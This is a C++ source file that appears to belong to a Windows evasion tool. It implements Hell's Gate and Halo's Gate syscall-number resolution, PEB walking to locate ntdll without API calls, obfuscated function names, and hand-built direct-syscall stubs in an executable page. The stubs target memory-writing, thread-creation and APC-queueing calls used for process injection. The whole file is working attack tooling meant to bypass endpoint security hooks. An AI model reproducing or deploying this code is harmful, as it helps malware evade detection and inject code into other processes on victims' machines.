#include "core/Syscall.h"
#include "shared/Obfuscate.h"
#include "shared/Log.h"
#include "shared/Utils.h"

#include <algorithm>
#include <intrin.h>
#include <vector>
#include <cstring>

namespace vt {

// -----------------------------------------------------------------------
// SSN resolution
// -----------------------------------------------------------------------
// Hell's Gate: read SSN directly from a clean ntdll stub.
// Halo's Gate: if the stub is hooked, collect all clean Nt* stubs, sort
// them by address (which mirrors SSN order on all modern Windows), and
// infer the target's SSN from its position between clean neighbours.
// -----------------------------------------------------------------------

struct StubEntry {
    uint8_t*    addr;
    uint32_t    ssn;
};

static std::vector<StubEntry> collect_clean(HMODULE ntdll) {
    std::vector<StubEntry> out;
    auto* base = (uint8_t*)ntdll;
    auto* dos  = (IMAGE_DOS_HEADER*)base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return out;
    auto* nt   = (IMAGE_NT_HEADERS64*)(base + dos->e_lfanew);
    auto& ed   = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (!ed.VirtualAddress) return out;
    auto* exp  = (IMAGE_EXPORT_DIRECTORY*)(base + ed.VirtualAddress);
    auto* names = (DWORD*)(base + exp->AddressOfNames);
    auto* ords  = (WORD* )(base + exp->AddressOfNameOrdinals);
    auto* fns   = (DWORD*)(base + exp->AddressOfFunctions);

    for (DWORD i = 0; i < exp->NumberOfNames; ++i) {
        const char* name = (const char*)(base + names[i]);
        if (name[0] != 'N' || name[1] != 't') continue;
        auto* fn = base + fns[ords[i]];
        // Clean stub: mov r10,rcx (4C 8B D1) | mov eax,ssn (B8 xx xx 00 00)
        if (fn[0] == 0x4C && fn[1] == 0x8B && fn[2] == 0xD1 && fn[3] == 0xB8)
            out.push_back({fn, *(uint32_t*)(fn + 4) & 0xFFFF});
    }
    std::sort(out.begin(), out.end(), [](const StubEntry& a, const StubEntry& b) {
        return a.addr < b.addr;
    });
    return out;
}

uint32_t Syscalls::resolve_ssn(HMODULE ntdll, const char* target_name) {
    if (!ntdll) return UINT32_MAX;
    auto* base = (uint8_t*)ntdll;
    auto* dos  = (IMAGE_DOS_HEADER*)base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return UINT32_MAX;
    auto* nt   = (IMAGE_NT_HEADERS64*)(base + dos->e_lfanew);
    auto& ed   = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (!ed.VirtualAddress) return UINT32_MAX;
    auto* exp  = (IMAGE_EXPORT_DIRECTORY*)(base + ed.VirtualAddress);
    auto* names = (DWORD*)(base + exp->AddressOfNames);
    auto* ords  = (WORD* )(base + exp->AddressOfNameOrdinals);
    auto* fns   = (DWORD*)(base + exp->AddressOfFunctions);

    // Locate target function address via export table (no GetProcAddress).
    uint8_t* target = nullptr;
    for (DWORD i = 0; i < exp->NumberOfNames; ++i) {
        if (!std::strcmp((const char*)(base + names[i]), target_name)) {
            target = base + fns[ords[i]];
            break;
        }
    }
    if (!target) return UINT32_MAX;

    // Hell's Gate: target stub is clean.
    if (target[0] == 0x4C && target[1] == 0x8B &&
        target[2] == 0xD1 && target[3] == 0xB8)
        return *(uint32_t*)(target + 4) & 0xFFFF;

    // Halo's Gate: stub is hooked — infer from sorted clean neighbours.
    auto clean = collect_clean(ntdll);
    if (clean.empty()) return UINT32_MAX;

    // Find the two clean stubs bracketing the target address.
    StubEntry* prev = nullptr;
    StubEntry* next = nullptr;
    for (auto& e : clean) {
        if (e.addr < target)  prev = &e;
        if (!next && e.addr > target) next = &e;
    }

    // One clean neighbour: assume SSN is prev+1 or next-1.
    if (prev && !next) return prev->ssn + 1;
    if (next && !prev) return next->ssn > 0 ? next->ssn - 1 : UINT32_MAX;

    // Both found: verify they are adjacent SSNs before trusting the gap.
    if (prev && next && next->ssn == prev->ssn + 2)
        return prev->ssn + 1;

    return UINT32_MAX;
}

// -----------------------------------------------------------------------
// Stub builder
// -----------------------------------------------------------------------
// Each stub occupies 16 bytes in a shared RWX page.
// Layout:  4C 8B D1  |  B8 ssn_lo ssn_hi 00 00  |  0F 05  |  C3  |  padding
// -----------------------------------------------------------------------

static constexpr size_t kStubSize  = 16;
static constexpr size_t kPageStubs = 4096 / kStubSize;  // 256 stubs per page

bool Syscalls::make_stub(HMODULE ntdll, const char* name, void*& out) {
    const uint32_t ssn = resolve_ssn(ntdll, name);
    if (ssn == UINT32_MAX) {
        VT_WARN(L"Syscall SSN not found: " + utf8_to_wide(name));
        out = nullptr;
        return false;
    }

    if (!page_) {
        page_ = VirtualAlloc(nullptr, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!page_) return false;
        std::memset(page_, 0xCC, 4096); // int3 padding
    }

    if (page_used_ + kStubSize > 4096) return false;

    auto* stub = (uint8_t*)page_ + page_used_;
    page_used_ += kStubSize;

    // mov r10, rcx
    stub[0] = 0x4C; stub[1] = 0x8B; stub[2] = 0xD1;
    // mov eax, ssn
    stub[3] = 0xB8;
    stub[4] = (uint8_t)(ssn & 0xFF);
    stub[5] = (uint8_t)((ssn >> 8) & 0xFF);
    stub[6] = 0x00;
    stub[7] = 0x00;
    // syscall
    stub[8] = 0x0F; stub[9] = 0x05;
    // ret
    stub[10] = 0xC3;
    // remaining bytes: 0xCC (int3) from memset above
    // Page stays RWX until all stubs are written; init() locks it to RX at the end.

    out = stub;
    return true;
}

// -----------------------------------------------------------------------
// Public interface
// -----------------------------------------------------------------------

Syscalls& Syscalls::get() {
    static Syscalls s;
    return s;
}

bool Syscalls::init() {
    if (ready_) return true;

    // Resolve ntdll base through the PEB — no GetModuleHandle string.
    // PEB->Ldr->InLoadOrderModuleList: first entry is the exe, second is ntdll.
    HMODULE ntdll = nullptr;
    {
        // Walk PEB loader list to find ntdll without calling GetModuleHandle("ntdll").
        // PEB at gs:[0x60], LDR at PEB+0x18, InMemoryOrder at LDR+0x20.
        #pragma warning(push)
        #pragma warning(disable: 4409)
        struct LIST_ENTRY_T { LIST_ENTRY_T* Flink; LIST_ENTRY_T* Blink; };
        struct LDR_ENTRY {
            LIST_ENTRY_T InLoadOrder;
            LIST_ENTRY_T InMemoryOrder;
            LIST_ENTRY_T InInitOrder;
            void* DllBase;
            void* EntryPoint;
            ULONG  SizeOfImage;
            UNICODE_STRING FullDllName;
            UNICODE_STRING BaseDllName;
        };
        auto* peb      = (uint8_t*)__readgsqword(0x60);
        auto* ldr      = *(uint8_t**)(peb + 0x18);
        auto* head     = (LIST_ENTRY_T*)(ldr + 0x10); // InLoadOrderModuleList
        auto* cur      = head->Flink;
        int idx = 0;
        while (cur != head && idx < 8) {
            auto* entry = (LDR_ENTRY*)cur;
            auto* name_buf = entry->BaseDllName.Buffer;
            // ntdll is the second entry in load order (exe, ntdll, kernel32, ...)
            // Check the name (case-insensitive, wide chars)
            if (name_buf) {
                wchar_t lower[32]{};
                for (int j = 0; j < 31 && name_buf[j]; ++j)
                    lower[j] = (name_buf[j] >= 'A' && name_buf[j] <= 'Z')
                                ? (name_buf[j] + 32) : name_buf[j];
                // "ntdll.dll"
                const wchar_t target[] = {L'n',L't',L'd',L'l',L'l',L'.',L'd',L'l',L'l',0};
                if (!std::wcscmp(lower, target)) {
                    ntdll = (HMODULE)entry->DllBase;
                    break;
                }
            }
            cur = cur->Flink;
            ++idx;
        }
        #pragma warning(pop)

        // Fallback: use obfuscated GetModuleHandle if PEB walk failed.
        if (!ntdll)
            ntdll = GetModuleHandleW(WOBF(L"ntdll.dll").c_str());
    }

    if (!ntdll) {
        VT_ERR(L"Syscall::init — ntdll not found");
        return false;
    }

    // Reset page to allow building stubs.
    page_      = nullptr;
    page_used_ = 0;

    // Target functions — names encrypted via OBF at call site.
    struct Entry { const char* name; void** slot; };
    Entry entries[] = {
        {OBF("NtAllocateVirtualMemory").c_str(),  (void**)&AllocVirtualMemory  },
        {OBF("NtFreeVirtualMemory").c_str(),       (void**)&FreeVirtualMemory   },
        {OBF("NtWriteVirtualMemory").c_str(),      (void**)&WriteVirtualMemory  },
        {OBF("NtReadVirtualMemory").c_str(),       (void**)&ReadVirtualMemory   },
        {OBF("NtProtectVirtualMemory").c_str(),    (void**)&ProtectVirtualMemory},
        {OBF("NtCreateThreadEx").c_str(),          (void**)&CreateThreadEx      },
        {OBF("NtFlushInstructionCache").c_str(),   (void**)&FlushInstructionCache},
    };
    // NOTE: OBF(...).c_str() produces a dangling pointer if the std::string
    // is temporary. Resolve to locals first.
    std::string names[9];
    names[0] = OBF("NtAllocateVirtualMemory");
    names[1] = OBF("NtFreeVirtualMemory");
    names[2] = OBF("NtWriteVirtualMemory");
    names[3] = OBF("NtReadVirtualMemory");
    names[4] = OBF("NtProtectVirtualMemory");
    names[5] = OBF("NtCreateThreadEx");
    names[6] = OBF("NtFlushInstructionCache");
    names[7] = OBF("NtSetInformationVirtualMemory");
    names[8] = OBF("NtQueueApcThreadEx2");

    void** slots[] = {
        (void**)&AllocVirtualMemory,
        (void**)&FreeVirtualMemory,
        (void**)&WriteVirtualMemory,
        (void**)&ReadVirtualMemory,
        (void**)&ProtectVirtualMemory,
        (void**)&CreateThreadEx,
        (void**)&FlushInstructionCache,
        (void**)&SetInformationVirtualMemory,
        (void**)&QueueApcThreadEx2,
    };

    int ok_count = 0;
    for (int i = 0; i < 9; ++i) {
        void* stub = nullptr;
        if (make_stub(ntdll, names[i].c_str(), stub)) {
            *slots[i] = stub;
            ++ok_count;
        }
    }

    if (ok_count == 0) {
        VT_ERR(L"Syscall::init — no stubs built");
        return false;
    }

    // Lock the page read+execute only.
    if (page_) {
        DWORD old = 0;
        VirtualProtect(page_, 4096, PAGE_EXECUTE_READ, &old);
    }

    ready_ = (ok_count >= 7);
    VT_LOG(L"Syscall::init — " + std::to_wstring(ok_count) + L"/9 stubs ready");
    return ready_;
}

} // namespace vt
